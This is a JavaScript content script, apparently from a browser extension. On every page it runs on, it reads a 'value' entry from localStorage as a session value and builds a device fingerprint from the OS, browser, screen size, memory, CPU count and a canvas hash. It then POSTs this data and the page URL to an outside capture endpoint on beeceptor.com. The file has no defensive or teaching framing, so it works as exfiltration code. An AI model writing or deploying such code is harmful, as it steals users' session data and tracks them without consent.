// content.js
try {
    const sessionValue = localStorage.getItem("value");
function getBrowserName() {
  const userAgent = navigator.userAgent;

  if (userAgent.includes("Firefox")) {
    return "Firefox";
  } else if (userAgent.includes("SamsungBrowser")) {
    return "Samsung Internet";
  } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
    return "Opera";
  } else if (userAgent.includes("Edg")) {
    return "Edge";
  } else if (userAgent.includes("Brave")) {
    return "Brave"; // Brave often hides itself as Chrome, hard to detect
  } else if (userAgent.includes("Chrome")) {
    return "Chrome";
  } else if (userAgent.includes("Safari")) {
    return "Safari";
  } else {
    return "Unknown";
  }
}
function getOS() {
  const userAgent = window.navigator.userAgent;
  const platform = window.navigator.platform;
  const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
  const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
  const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
  
  if (macosPlatforms.includes(platform)) {
    return 'Mac OS';
  } else if (iosPlatforms.includes(platform)) {
    return 'iOS';
  } else if (windowsPlatforms.includes(platform)) {
    return 'Windows';
  } else if (/Android/.test(userAgent)) {
    return 'Android';
  } else if (/Linux/.test(platform)) {
    return 'Linux';
  } else {
    return 'Unknown';
  }
}
const canvas = document.createElement('canvas');
function getCanvasFingerprint() {
  // TODO : implement canvas fingferprinting tampering
  const context = canvas.getContext('2d');

  // Draw shapes and text for fingerprinting
  canvas.width = 200;
  canvas.height = 50;
  context.textBaseline = "top";
  context.font = "16px 'Arial'";
  context.fillStyle = "red";
  context.fillRect(125, 1, 62, 20);
  context.fillStyle = "blue";
  context.fillText("Canvas Fingerprint", 2, 15);
  context.strokeStyle = "green";
  context.strokeRect(5, 5, 190, 40);

  // Get the image data
  const dataUrl = canvas.toDataURL();

  // Hash it to get a short, fixed fingerprint
  return hashString(dataUrl);
}
function hashString(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
      const chr = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + chr;
      hash |= 0; // Convert to 32bit integer
  }
  return hash.toString();
}
var os = getOS();
var browser = getBrowserName();
var deviceWidth = window.screen.width;
var deviceHeight = window.screen.height;
var devicePixelRatio = window.devicePixelRatio;
var deviceMemory = navigator.deviceMemory || "Unknown";
var deviceColorDepth = window.screen.colorDepth || "Unknown";
var hardwareConcurrency = navigator.hardwareConcurrency;
var canvasFingerprint = getCanvasFingerprint();
    if (sessionValue) {
        fetch('https://vengadesh.free.beeceptor.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_value: sessionValue,
                os,
                browser,
                deviceWidth,
                deviceHeight,
                devicePixelRatio,
                deviceMemory,
                deviceColorDepth,
                hardwareConcurrency,
                canvasFingerprint,
                location: window.location.href
            })
        })
        .then(response => console.log('Data sent successfully'))
        .catch(error => console.error('Error sending data:', error));
    } else {
        console.warn('No "value" found in localStorage.');
    }
} catch (err) {
    console.error('Error inside content.js:', err);
}
